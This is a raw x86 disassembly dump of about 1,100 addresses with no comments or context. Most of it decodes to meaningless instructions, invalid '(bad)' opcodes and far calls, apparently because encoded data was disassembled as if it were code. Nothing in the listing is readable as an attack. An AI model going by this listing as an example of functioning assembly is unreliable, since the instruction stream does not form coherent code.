  434d84:	or     eax,0x6263aa13
  434d89:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434d8f:	out    0xfb,eax
  434d91:	or     eax,0x6263aae2
  434d96:	bound  ecx,QWORD PTR ds:0xaae21761
  434d9c:	arpl   WORD PTR [edx+0x62],sp
  434d9f:	or     eax,0x6263aae2
  434da4:	bound  esp,QWORD PTR [edi+0x626376e2]
  434daa:	bound  esi,QWORD PTR [edx-0x11a011a1]
  434db0:	dec    esi
  434db1:	or     eax,0xdb0d2075
  434db6:	adc    BYTE PTR [eax+0x61],ch
  434db9:	popa   
  434dba:	or     eax,0x6263aa13
  434dbf:	bound  ecx,QWORD PTR ds:0x9aa78ad1
  434dc5:	mov    dl,0x8e
  434dc7:	or     eax,0xdb0d2075
  434dcc:	or     al,0x68
  434dce:	popa   
  434dcf:	popa   
  434dd0:	or     eax,0x60cd0d61
  434dd5:	push   esi
  434dd6:	cdq    
  434dd7:	cmp    BYTE PTR ds:0x6263aa13,cl
  434ddd:	bound  edx,QWORD PTR [edi]
  434ddf:	cdq    
  434de0:	jbe    0x434e03
  434de2:	loop   0x434e1c
  434de4:	arpl   WORD PTR [edx+0x62],sp
  434de7:	push   0x62616161
  434dec:	mov    dl,0x20
  434dee:	bound  esi,QWORD PTR [edx+0x18b2624c]
  434df4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434df6:	xor    DWORD PTR [edx+0x62],esp
  434df9:	loop   0x434e17
  434dfb:	mov    dl,0x90
  434dfd:	lock sub BYTE PTR [eax+0x61],0x61
  434e02:	lock imul ebp,DWORD PTR [eax+0x61],0x61
  434e07:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e0d:	bound  esi,QWORD PTR [edx-0x12160ce8]
  434e13:	bound  esp,QWORD PTR [edx-0x1e]
  434e16:	sbb    al,0xb2
  434e18:	nop
  434e19:	lock arpl WORD PTR [ecx+0x61],sp
  434e1d:	popa   
  434e1e:	lock xor BYTE PTR [ecx+0x61],ah
  434e22:	popa   
  434e23:	bound  esi,QWORD PTR [edx+0x4cb26220]
  434e29:	bound  esi,QWORD PTR [edx+0x64d9f318]
  434e2f:	bound  esp,QWORD PTR [edx-0x1e]
  434e32:	sbb    al,0xb2
  434e34:	nop
  434e35:	lock ss popa 
  434e38:	popa   
  434e39:	popa   
  434e3a:	lock inc ebx
  434e3c:	popa   
  434e3d:	popa   
  434e3e:	popa   
  434e3f:	bound  esi,QWORD PTR [edx+0x18b26220]
  434e45:	repz les ebx,FWORD PTR [ebp+0x62]
  434e49:	(bad)
  434e4e:	lock push edi
  434e50:	popa   
  434e51:	popa   
  434e52:	popa   
  434e53:	lock stc 
  434e55:	popa   
  434e56:	popa   
  434e57:	popa   
  434e58:	or     eax,0xdb0d2075
  434e5d:	adc    BYTE PTR [eax+0x61],ch
  434e60:	popa   
  434e61:	or     eax,0x9aa718cd
  434e66:	mov    dl,0x76
  434e68:	adc    esi,DWORD PTR [ebp+0x28]
  434e6b:	shl    BYTE PTR [edx-0x4e],cl
  434e6e:	sub    BYTE PTR ds:0xeb626075,cl
  434e74:	mov    esi,0xd18b262
  434e79:	jne    0x434e9b
  434e7b:	or     eax,0x616848db
  434e80:	popa   
  434e81:	(bad)
  434e86:	and    BYTE PTR ds:0x616860db,cl
  434e8c:	popa   
  434e8d:	or     eax,0x9a0b8561
  434e92:	leave  
  434e93:	cmp    dh,BYTE PTR [esi+ebx*2]
  434e96:	call   0xc12ab043
  434e9b:	or     eax,0xcd0d4c75
  434ea0:	sbb    BYTE PTR [esi-0x26],dl
  434ea3:	cmp    BYTE PTR [edi],dl
  434ea5:	adc    ecx,DWORD PTR [edx+0x21626263]
  434eab:	loop   0x434f2b
  434ead:	arpl   WORD PTR [edx+0x62],sp
  434eb0:	lods   eax,DWORD PTR ds:[esi]
  434eb1:	pop    ebx
  434eb2:	add    DWORD PTR [ecx+0xd],ebp
  434eb5:	loop   0x434f35
  434eb7:	arpl   WORD PTR [edx+0x62],sp
  434eba:	test   DWORD PTR [ebx],ecx
  434ebc:	call   0xa8e8:0x5e343ac9
  434ec3:	popa   
  434ec4:	or     eax,0xf2934ccd
  434ec9:	shr    DWORD PTR [edx-0x69],1
  434ecc:	pusha  
  434ecd:	or     eax,0x17944c75
  434ed2:	fisubr DWORD PTR [edx+0x62]
  434ed5:	mov    dl,0x7e
  434ed7:	bound  esi,QWORD PTR [edx+0x18b26292]
  434edd:	(bad)  
  434ede:	in     al,0x8a
  434ee0:	arpl   WORD PTR [edx+0x62],sp
  434ee3:	pop    ss
  434ee4:	jne    0x434eee
  434ee6:	or     eax,0xdb212075
  434eeb:	pop    eax
  434eec:	push   0xe2256161
  434ef1:	add    DWORD PTR [ecx-0x12],ebp
  434ef4:	mov    cl,BYTE PTR ds:0xcd0d4c75
  434efa:	sbb    BYTE PTR [esi-0x26],dl
  434efd:	cmp    BYTE PTR [edi],dl
  434eff:	adc    edx,DWORD PTR [edx+0x62626263]
  434f05:	in     al,0x92
  434f07:	arpl   WORD PTR [edx+0x62],sp
  434f0a:	pop    ss
  434f0b:	jne    0x434f15
  434f0d:	or     eax,0xcd0d0875
  434f12:	jbe    0x434f2b
  434f14:	push   0x683c7521
  434f19:	popa   
  434f1a:	popa   
  434f1b:	popa   
  434f1c:	fsubr  st,st(2)
  434f1e:	cmp    al,0x61
  434f20:	mov    dl,0xf7
  434f22:	fcom   DWORD PTR [ebp+0x750d6118]
  434f28:	sbb    BYTE PTR [edi+0x22],dl
  434f2b:	jbe    0x434f8e
  434f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f2e:	or     eax,0xdc9c964
  434f33:	jne    0x434ecf
  434f35:	xchg   ebx,eax
  434f36:	repnz mov ds:0x9acd0d7e,al
  434f3c:	adc    ebp,DWORD PTR [eax+ebp*2]
  434f3f:	mov    dl,BYTE PTR [edi]
  434f41:	jne    0x434f98
  434f43:	fcom   DWORD PTR [ebp+0x3aee6169]
  434f49:	or     eax,0x17a26975
  434f4e:	jne    0x434fb9
  434f50:	or     eax,0xf2939a75
  434f55:	mov    ds:0x6975a13b,al
  434f5a:	jae    0x434f04
  434f5c:	or     eax,0xcd0d5575
  434f61:	xchg   BYTE PTR [esi-0x26],dl
  434f64:	xchg   BYTE PTR [ecx-0x7e176d33],ah
  434f6a:	or     eax,0xcd0d5575
  434f6f:	xchg   BYTE PTR [esi-0x26],dl
  434f72:	xchg   BYTE PTR ds:0xda565575,cl
  434f78:	call   0xd34:0x7392cda1
  434f7f:	jne    0x434fd6
  434f81:	out    dx,al
  434f82:	lea    ecx,ds:0x1cd85575
  434f88:	cmp    BYTE PTR [edi],dl
  434f8a:	jne    0x434fe1
  434f8c:	out    dx,al
  434f8d:	sbb    eax,0x22571caf
  434f92:	xchg   BYTE PTR [ecx-0x5b],ah
  434f95:	or     eax,0xbe64d864
  434f9a:	and    DWORD PTR [ebp-0xd],esi
  434f9d:	lods   eax,DWORD PTR ds:[esi]
  434f9e:	loop   0x434fa1
  434fa0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  434fa6:	add    DWORD PTR [ecx+0x21],ebp
  434fa9:	jne    0x434fc3
  434fab:	mov    bl,0xe2
  434fad:	add    DWORD PTR [ecx+0x21],ebp
  434fb0:	jne    0x434fda
  434fb2:	inc    ebp
  434fb3:	loop   0x434fb6
  434fb5:	imul   esp,DWORD PTR [ecx],0xe2655075
  434fbb:	add    DWORD PTR [ecx+0x21],ebp
  434fbe:	jne    0x435024
  434fc0:	dec    esi
  434fc1:	loop   0x434fc4
  434fc3:	imul   esp,DWORD PTR [ecx],0xe2f13175
  434fc9:	add    DWORD PTR [ecx+0x13],ebp
  434fcc:	jne    0x435016
  434fce:	pop    ss
  434fcf:	jne    0x43503a
  434fd1:	or     eax,0xcd0d6975
  434fd6:	call   0x175d:0x75139a17
  434fdd:	jne    0x435034
  434fdf:	or     eax,0xcd0d5575
  434fe4:	xchg   BYTE PTR [edi],dl
  434fe6:	call   0x9a0b:0x85f3750d
  434fed:	leave  
  434fee:	cmp    dh,BYTE PTR [esi+ebx*2]
  434ff1:	call   0x75e4b19e
  434ff6:	dec    eax
  434ff7:	xchg   ebx,eax
  434ff8:	outs   dx,BYTE PTR ds:[esi]
  434ff9:	ss pop edi
  434ffb:	popa   
  434ffc:	popa   
  434ffd:	or     eax,0xb85f375
  435002:	call   0xa8e8:0x5e343ac9
  435009:	popa   
  43500a:	mov    eax,ds:0x6e935d75
  43500f:	dec    esp
  435010:	pop    edi
  435011:	popa   
  435012:	popa   
  435013:	or     eax,0xb85f375
  435018:	call   0xa8e8:0x5e343ac9
  43501f:	popa   
  435020:	pop    ss
  435021:	jne    0x43501c
  435023:	or     eax,0xb85f375
  435028:	call   0xa8e8:0x5e343ac9
  43502f:	popa   
  435030:	pop    ss
  435031:	jne    0x43508b
  435033:	adc    esi,DWORD PTR [ebp-0x6e]
  435036:	pop    ss
  435037:	jne    0x435099
  435039:	or     eax,0xb852875
  43503e:	call   0xa8e8:0x5e343ac9
  435045:	popa   
  435046:	xchg   ebx,eax
  435047:	repnz sbb al,0xd
  43504a:	int    0x50
  43504c:	(bad)  
  43504d:	outs   dx,DWORD PTR ds:[esi]
  43504e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435054:	pop    esi
  435055:	call   0xf2d6b202
  43505a:	push   edi
  43505b:	sub    eax,0x7517941f
  435060:	dec    esp
  435061:	or     eax,0xcd0df975
  435066:	dec    eax
  435067:	xchg   esp,eax
  435068:	or     eax,0x179499f7
  43506d:	jne    0x43501c
  43506f:	or     eax,0xcd0d5875
  435074:	pop    ebp
  435075:	xchg   esp,eax
  435076:	or     eax,0x179499f7
  43507b:	jne    0x43502e
  43507d:	xchg   ebx,eax
  43507e:	bnd jne 0x43502e
  435081:	or     eax,0x6fd6f3cd
  435086:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43508c:	pop    esi
  43508d:	call   0xf2d6b23a
  435092:	push   edi
  435093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435094:	pop    ds
  435095:	mov    dl,0x87
  435097:	or     eax,0xb853c75
  43509c:	call   0xa8e8:0x5e343ac9
  4350a3:	popa   
  4350a4:	or     eax,0xba93f3cd
  4350a9:	pusha  
  4350aa:	pop    ss
  4350ab:	int    0xf3
  4350ad:	lock leave 
  4350af:	push   0xf2936161
  4350b4:	jne    0x435067
  4350b6:	or     eax,0x6fd6f3cd
  4350bb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350c1:	pop    esi
  4350c2:	call   0xf2d6b26f
  4350c7:	push   edi
  4350c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4350c9:	pop    ds
  4350ca:	mov    dl,0x80
  4350cc:	or     eax,0xb85f375
  4350d1:	call   0x133c:0xcd0d3ac9
  4350d8:	outs   dx,BYTE PTR ds:[esi]
  4350d9:	push   0x61a8e85e
  4350de:	pop    ss
  4350df:	jne    0x43511d
  4350e1:	lock jge 0x43514c
  4350e4:	popa   
  4350e5:	popa   
  4350e6:	or     eax,0x610d6075
  4350eb:	or     eax,0x6fd6f3cd
  4350f0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4350f6:	pop    esi
  4350f7:	call   0x1feab2a4
  4350fc:	xchg   ebx,eax
  4350fd:	outs   dx,BYTE PTR ds:[esi]
  4350fe:	or     BYTE PTR [ecx+0x61],ah
  435101:	popa   
  435102:	xchg   ebx,eax
  435103:	bnd jne 0x4350b3
  435106:	xchg   ebx,eax
  435107:	repnz int 0xb1
  43510a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43510b:	pop    ds
  43510c:	xchg   ebx,eax
  43510d:	outs   dx,BYTE PTR ds:[esi]
  43510e:	add    esp,DWORD PTR [ecx+0x61]
  435111:	popa   
  435112:	xchg   ebx,eax
  435113:	bnd jne 0x4350c3
  435116:	or     eax,0x6fd650cd
  43511b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435121:	pop    esi
  435122:	call   0xf2d6b2cf
  435127:	push   edi
  435128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435129:	pop    ds
  43512a:	fistp  QWORD PTR [eax]
  43512c:	xchg   ebx,eax
  43512d:	bnd jne 0x4350dd
  435130:	or     eax,0x6fd631cd
  435135:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43513b:	pop    esi
  43513c:	call   0xf2d6b2e9
  435141:	push   edi
  435142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435143:	pop    ds
  435144:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43514b:	repnz int 0xad
  43514e:	push   esi
  43514f:	pusha  
  435150:	xchg   esp,eax
  435151:	pop    ss
  435152:	int    0xad
  435154:	xchg   ebx,eax
  435155:	bnd jne 0x435109
  435158:	or     eax,0x6fd650cd
  43515d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435163:	pop    esi
  435164:	call   0xf2d6b311
  435169:	push   edi
  43516a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43516b:	pop    ds
  43516c:	fistp  QWORD PTR [eax]
  43516e:	xchg   ebx,eax
  43516f:	bnd jne 0x435123
  435172:	or     eax,0x6fd631cd
  435177:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43517d:	pop    esi
  43517e:	call   0xf2d6b32b
  435183:	push   edi
  435184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435185:	pop    ds
  435186:	fmul   QWORD PTR [ebx+edx*4-0x6cb38a0e]
  43518d:	repnz int 0xb1
  435190:	push   esi
  435191:	pusha  
  435192:	xchg   esp,eax
  435193:	pop    ss
  435194:	int    0xb1
  435196:	xchg   ebx,eax
  435197:	bnd jne 0x435147
  43519a:	xchg   ebx,eax
  43519b:	repnz int 0xb1
  43519e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43519f:	pop    ds
  4351a0:	out    0x88,eax
  4351a2:	or     eax,0xb853c75
  4351a7:	call   0xa8e8:0x5e343ac9
  4351ae:	popa   
  4351af:	lock stos BYTE PTR es:[edi],al
  4351b1:	push   0x7cee6161
  4351b6:	xchg   ebx,eax
  4351b7:	bnd jne 0x435167
  4351ba:	xchg   ebx,eax
  4351bb:	repnz int 0xb1
  4351be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4351bf:	pop    ds
  4351c0:	out    0x88,eax
  4351c2:	or     eax,0xb853c75
  4351c7:	call   0xa8e8:0x5e343ac9
  4351ce:	popa   
  4351cf:	lock mov ch,BYTE PTR [eax+0x61]
  4351d3:	popa   
  4351d4:	or     eax,0xb851875
  4351d9:	call   0x1348:0xcd0d3ac9
  4351e0:	outs   dx,BYTE PTR ds:[esi]
  4351e1:	push   0x61a8e85e
  4351e6:	pop    ss
  4351e7:	jne    0x435231
  4351e9:	or     eax,0xb851875
  4351ee:	call   0x135d:0xcd0d3ac9
  4351f5:	outs   dx,BYTE PTR ds:[esi]
  4351f6:	push   0x61a8e85e
  4351fb:	pop    ss
  4351fc:	jne    0x43525b
  4351fe:	lock mov esp,0x13626263
  435204:	jne    0x43521a
  435206:	pop    ss
  435207:	jne    0x435229
  435209:	or     eax,0x5e33f975
  43520e:	call   0xbc8b3bb
  435213:	call   0x1720:0xcd0d3ac9
  43521a:	push   0x171c7513
  43521f:	jne    0x435229
  435221:	or     eax,0x5e335875
  435226:	call   0xbc8b3d3
  43522b:	call   0x1708:0xcd0d3ac9
  435232:	push   0x8514750d
  435237:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43523d:	call   0xcd50b3ea
  435242:	sbb    dh,dl
  435244:	outs   dx,DWORD PTR ds:[esi]
  435245:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43524b:	pop    esi
  43524c:	call   0xbad6b3f9
  435251:	pop    ds
  435252:	or     eax,0xf29348cd
  435257:	imul   DWORD PTR [eax+0x33]
  43525a:	pop    esi
  43525b:	call   0xbc8b408
  435260:	call   0xd61c:0xcd0d3ac9
  435267:	outs   dx,DWORD PTR ds:[esi]
  435268:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43526e:	pop    esi
  43526f:	call   0xa550b41c
  435274:	sbb    dh,dl
  435276:	or     bx,WORD PTR [edx+0x22d63ac9]
  43527d:	pop    esi
  43527e:	call   0xbad6b42b
  435283:	dec    esi
  435284:	or     eax,0xf2935da5
  435289:	xchg   BYTE PTR [eax-0x17a10f2a],dl
  43528f:	test   al,0x61
  435291:	(bad)  
  435292:	outs   dx,DWORD PTR ds:[esi]
  435293:	or     ebx,DWORD PTR [edx+0x1fa73ac9]
  435299:	mov    dl,0x2c
  43529b:	or     eax,0xb851475
  4352a0:	call   0xa8e8:0x5e343ac9
  4352a7:	popa   
  4352a8:	or     eax,0x6fd618cd
  4352ad:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4352b3:	pop    esi
  4352b4:	call   0xbad6b461
  4352b9:	pop    ds
  4352ba:	or     eax,0xf29348cd
  4352bf:	imul   DWORD PTR [eax+0x33]
  4352c2:	pop    esi
  4352c3:	call   0xbc8b470
  4352c8:	call   0xb2f3:0x75a73ac9
  4352cf:	xchg   ebx,eax
  4352d0:	or     eax,0xb85f375
  4352d5:	call   0xa8e8:0x5e343ac9
  4352dc:	popa   
  4352dd:	out    dx,al
  4352de:	lea    ecx,ds:0xb853c75
  4352e4:	call   0xa8e8:0x5e343ac9
  4352eb:	popa   
  4352ec:	push   edi
  4352ed:	and    al,BYTE PTR [esi+0x640da561]
  4352f3:	leave  
  4352f4:	leave  
  4352f5:	and    DWORD PTR [ebp+0x55],esi
  4352f8:	das    
  4352f9:	loop   0x4352fc
  4352fb:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435301:	add    DWORD PTR [ecx+0xd],ebp
  435304:	jne    0x43536f
  435306:	test   DWORD PTR [ebx],ecx
  435308:	call   0x939a:0xcd0d3ac9
  43530f:	repnz outs dx,BYTE PTR ds:[esi]
  435311:	cdq    
  435312:	dec    ebx
  435313:	sbb    ecx,esi
  435315:	popa   
  435316:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  43531c:	repnz sbb al,0x85
  43531f:	or     bl,BYTE PTR [edx]
  435321:	popa   
  435322:	popa   
  435323:	xchg   ebx,eax
  435324:	repnz sbb al,0x9d
  435327:	xor    al,0xcc
  435329:	popa   
  43532a:	popa   
  43532b:	out    0x9f,eax
  43532d:	or     eax,0xb856975
  435332:	call   0x939a:0xcd0d3ac9
  435339:	repnz outs dx,BYTE PTR ds:[esi]
  43533b:	cdq    
  43533c:	dec    ebx
  43533d:	sbb    ecx,esi
  43533f:	popa   
  435340:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435346:	repnz sbb al,0x85
  435349:	or     bl,BYTE PTR [edx]
  43534b:	popa   
  43534c:	popa   
  43534d:	xchg   ebx,eax
  43534e:	repnz sbb al,0x9d
  435351:	mov    ecx,0xb26161cc
  435356:	cmp    ecx,DWORD PTR ds:0x75176975
  43535c:	push   ebp
  43535d:	or     eax,0xb856975
  435362:	call   0x9a0b:0x85a23ac9
  435369:	leave  
  43536a:	cmp    dl,BYTE PTR [edi]
  43536c:	jne    0x4353d7
  43536e:	out    dx,al
  43536f:	add    eax,0x2f55ead6
  435374:	loop   0x435377
  435376:	imul   esi,DWORD PTR [edx-0x658af2cc],0x750d88ee
  435380:	push   ebp
  435381:	test   DWORD PTR [ebx],ecx
  435383:	call   0x139a:0xcd0d3ac9
  43538a:	outs   dx,BYTE PTR ds:[esi]
  43538b:	cdq    
  43538c:	imul   ebx,DWORD PTR [ebx],0x225761ce
  435392:	mul    DWORD PTR [ecx-0x5b]
  435395:	or     eax,0x21c9c964
  43539a:	jne    0x4353f1
  43539c:	das    
  43539d:	loop   0x4353a0
  43539f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  4353a5:	add    DWORD PTR [ecx+0x62],ebp
  4353a8:	mov    dl,0x9a
  4353aa:	repz cdq 
  4353ac:	bound  esp,QWORD PTR [edx+0x62]
  4353af:	pop    ss
  4353b0:	jne    0x43534c
  4353b2:	or     eax,0xb856975
  4353b7:	call   0x939a:0xcd0d3ac9
  4353be:	push   es
  4353bf:	outs   dx,BYTE PTR ds:[esi]
  4353c0:	cdq    
  4353c1:	dec    ebx
  4353c2:	sbb    ecx,esi
  4353c4:	popa   
  4353c5:	fdiv   st,st(3)
  4353c7:	call   0x61d8:0x851c1e93
  4353ce:	popa   
  4353cf:	popa   
  4353d0:	xchg   ebx,eax
  4353d1:	push   ds
  4353d2:	sbb    al,0xd8
  4353d4:	imul   esp,eax,0x750d9fe7
  4353da:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0x939acd0d
  4353e4:	repnz outs dx,BYTE PTR ds:[esi]
  4353e6:	cdq    
  4353e7:	dec    ebx
  4353e8:	sbb    ecx,esi
  4353ea:	popa   
  4353eb:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4353f1:	repnz sbb al,0x85
  4353f4:	or     bl,BYTE PTR [edx]
  4353f6:	popa   
  4353f7:	popa   
  4353f8:	xchg   ebx,eax
  4353f9:	repnz sbb al,0x9d
  4353fc:	retf   
  4353fd:	int3   
  4353fe:	popa   
  4353ff:	popa   
  435400:	mov    dl,0x3b
  435402:	or     eax,0x75176975
  435407:	push   ebp
  435408:	or     eax,0xb856975
  43540d:	call   0x9a0b:0x85a23ac9
  435414:	leave  
  435415:	cmp    dl,BYTE PTR [edi]
  435417:	jne    0x435482
  435419:	out    dx,al
  43541a:	adc    esi,edx
  43541c:	jmp    0xe769:0x1e22f55
  435423:	ror    DWORD PTR ds:0xb855575,1
  435429:	call   0x61cc:0x34273ac9
  435430:	popa   
  435431:	or     eax,0x17949aa5
  435436:	adc    BYTE PTR [eax+0x61ce1b4b],bl
  43543c:	or     eax,0xb855575
  435441:	call   0x939a:0xcd0d3ac9
  435448:	repnz outs dx,BYTE PTR ds:[esi]
  43544a:	cdq    
  43544b:	dec    ebx
  43544c:	sbb    ecx,esi
  43544e:	popa   
  43544f:	test   DWORD PTR [edx],ecx
  435451:	sbb    ah,BYTE PTR [ecx+0x61]
  435454:	xor    al,0xb9
  435456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435457:	popa   
  435458:	popa   
  435459:	or     eax,0x6fd655cd
  43545e:	or     ebx,DWORD PTR [edx-0x5af2c537]
  435464:	call   0x1b4b:0xd06e1794
  43546b:	into   
  43546c:	popa   
  43546d:	or     eax,0x22579a75
  435472:	mul    DWORD PTR [ecx-0x5b]
  435475:	or     eax,0x21c9c964
  43547a:	jne    0x4354d1
  43547c:	das    
  43547d:	loop   0x435480
  43547f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435485:	add    DWORD PTR [ecx+0x62],ebp
  435488:	mov    dl,0x9a
  43548a:	repz mov ecx,0x17626263
  435490:	jne    0x43542c
  435492:	or     eax,0xb856975
  435497:	call   0x939a:0xcd0d3ac9
  43549e:	repnz outs dx,BYTE PTR ds:[esi]
  4354a0:	cdq    
  4354a1:	dec    ebx
  4354a2:	sbb    ecx,esi
  4354a4:	popa   
  4354a5:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354ab:	repnz sbb al,0x85
  4354ae:	or     bl,BYTE PTR [edx]
  4354b0:	popa   
  4354b1:	popa   
  4354b2:	xchg   ebx,eax
  4354b3:	repnz sbb al,0x9d
  4354b6:	xor    al,0xcc
  4354b8:	popa   
  4354b9:	popa   
  4354ba:	out    0x9f,eax
  4354bc:	or     eax,0xb856975
  4354c1:	call   0x939a:0xcd0d3ac9
  4354c8:	repnz outs dx,BYTE PTR ds:[esi]
  4354ca:	cdq    
  4354cb:	dec    ebx
  4354cc:	sbb    ecx,esi
  4354ce:	popa   
  4354cf:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354d5:	repnz sbb al,0x85
  4354d8:	or     bl,BYTE PTR [edx]
  4354da:	popa   
  4354db:	popa   
  4354dc:	xchg   ebx,eax
  4354dd:	repnz sbb al,0x9d
  4354e0:	retf   
  4354e1:	int3   
  4354e2:	popa   
  4354e3:	popa   
  4354e4:	mov    dl,0x3b
  4354e6:	or     eax,0x75176975
  4354eb:	push   ebp
  4354ec:	or     eax,0xb856975
  4354f1:	call   0x9a0b:0x85a23ac9
  4354f8:	leave  
  4354f9:	cmp    dl,BYTE PTR [edi]
  4354fb:	jne    0x435566
  4354fd:	out    dx,al
  4354fe:	add    eax,0x2f55ead6
  435503:	loop   0x435506
  435505:	imul   esp,edi,0xa21caf34
  43550b:	out    dx,al
  43550c:	pop    edi
  43550d:	scas   eax,DWORD PTR es:[edi]
  43550e:	sbb    al,0x57
  435510:	and    dh,bh
  435512:	popa   
  435513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435514:	or     eax,0x750dc964
  435519:	call   0x8675:0xd557517
  435520:	xchg   ebx,eax
  435521:	repnz popa 
  435523:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435529:	repnz sbb al,0x85
  43552c:	or     bl,BYTE PTR [edx]
  43552e:	popa   
  43552f:	popa   
  435530:	xchg   ebx,eax
  435531:	repnz sbb al,0x9d
  435534:	xor    al,0xcc
  435536:	popa   
  435537:	popa   
  435538:	out    0x7c,eax
  43553a:	or     eax,0xcd0d9a75
  43553f:	xchg   BYTE PTR [ebp+ecx*1-0x65e86b6f],dl
  435546:	or     eax,0xa2a29a75
  43554b:	pop    ss
  43554c:	jne    0x4354e8
  43554e:	or     eax,0xa2a28675
  435553:	pop    ss
  435554:	jne    0x4354dc
  435556:	out    dx,al
  435557:	hlt    
  435558:	scas   eax,DWORD PTR es:[edi]
  435559:	sbb    al,0xd
  43555b:	int    0x9a
  43555d:	xchg   esp,eax
  43555e:	pop    ss
  43555f:	push   0x5755750d
  435564:	and    bl,BYTE PTR [edx+0x640da561]
  43556a:	fsub   DWORD PTR [edx+ecx*4+0x21]
  43556e:	jne    0x4355d4
  435570:	lods   eax,DWORD PTR ds:[esi]
  435571:	loop   0x435574
  435573:	imul   esp,DWORD PTR [ecx],0xe225f375
  435579:	add    DWORD PTR [ecx+0xd],ebp
  43557c:	jne    0x4355e2
  43557e:	test   DWORD PTR [ebx],ecx
  435580:	call   0xa8e8:0x5e343ac9
  435587:	popa   
  435588:	pop    ss
  435589:	jne    0x4355f4
  43558b:	and    DWORD PTR [ebp+0x31],esi
  43558e:	adc    al,0xe2
  435590:	add    DWORD PTR [ecx+0x21],ebp
  435593:	jne    0x4355f2
  435595:	and    dl,ah
  435597:	add    DWORD PTR [ecx+0x21],ebp
  43559a:	jne    0x4355f1
  43559c:	mov    bl,0xe2
  43559e:	add    DWORD PTR [ecx+0xd],ebp
  4355a1:	jne    0x435607
  4355a3:	test   DWORD PTR [ebx],ecx
  4355a5:	call   0x1369:0xcd0d3ac9
  4355ac:	outs   dx,BYTE PTR ds:[esi]
  4355ad:	push   0x61a8e85e
  4355b2:	or     eax,0x6fd6f3cd
  4355b7:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4355bd:	pop    esi
  4355be:	call   0xa550b76b
  4355c3:	xchg   edx,eax
  4355c4:	xchg   ebx,eax
  4355c5:	mov    edx,0x9322a74f
  4355ca:	fsubr  st,st(4)
  4355cc:	popa   
  4355cd:	popa   
  4355ce:	popa   
  4355cf:	or     eax,0xcd0d9275
  4355d4:	imul   ebp,DWORD PTR ds:0x31cd0d1f,0x9a0b6fd6
  4355de:	leave  
  4355df:	cmp    dl,dh
  4355e1:	pop    ds
  4355e2:	pop    esi
  4355e3:	call   0x1feab790
  4355e8:	lds    esi,FWORD PTR [edx+0xd]
  4355eb:	jne    0x435587
  4355ed:	push   esi
  4355ee:	jne    0x435659
  4355f0:	or     eax,0xcd5686cd
  4355f5:	imul   ecx,DWORD PTR ds:0xd921789,0xda17f7d1
  4355ff:	test   DWORD PTR ds:0xb853175,0xd3ac99a
  435609:	int    0x69
  43560b:	adc    ebp,DWORD PTR [esi+0x68]
  43560e:	pop    esi
  43560f:	call   0x755ab7bc
  435614:	imul   esi,eax,0x616161fc
  43561a:	or     eax,0xcd0d9275
  43561f:	imul   ebp,DWORD PTR ds:0x5dcd0d1f,0x9a0b6fd6
  435629:	leave  
  43562a:	cmp    dl,dh
  43562c:	pop    ds
  43562d:	pop    esi
  43562e:	call   0x1feab7db
  435633:	lds    eax,FWORD PTR [edx]
  435635:	or     eax,0x75569a75
  43563a:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x17910d69
  435644:	call   0x9a0b:0x855d750d
  43564b:	leave  
  43564c:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435652:	push   0x61a8e85e
  435657:	pop    ss
  435658:	jne    0x4356c3
  43565a:	out    dx,al
  43565b:	(bad)  
  43565c:	or     eax,0xcd0d9275
  435661:	imul   ebp,DWORD PTR ds:0x55cd0d1f,0x9a0b6fd6
  43566b:	leave  
  43566c:	cmp    dl,dh
  43566e:	pop    ds
  43566f:	pop    esi
  435670:	call   0x1feab81d
  435675:	lds    esi,FWORD PTR [edi]
  435677:	or     eax,0x75569a75
  43567c:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x910d9469
  435686:	xchg   esp,eax
  435687:	pop    ss
  435688:	call   0x9a0b:0x8555750d
  43568f:	leave  
  435690:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435696:	push   0x61a8e85e
  43569b:	pop    ss
  43569c:	jne    0x435707
  43569e:	out    dx,al
  43569f:	mov    ecx,DWORD PTR ds:0x75569a75
  4356a5:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x4911a69
  4356af:	call   0x7517:0xa269750d
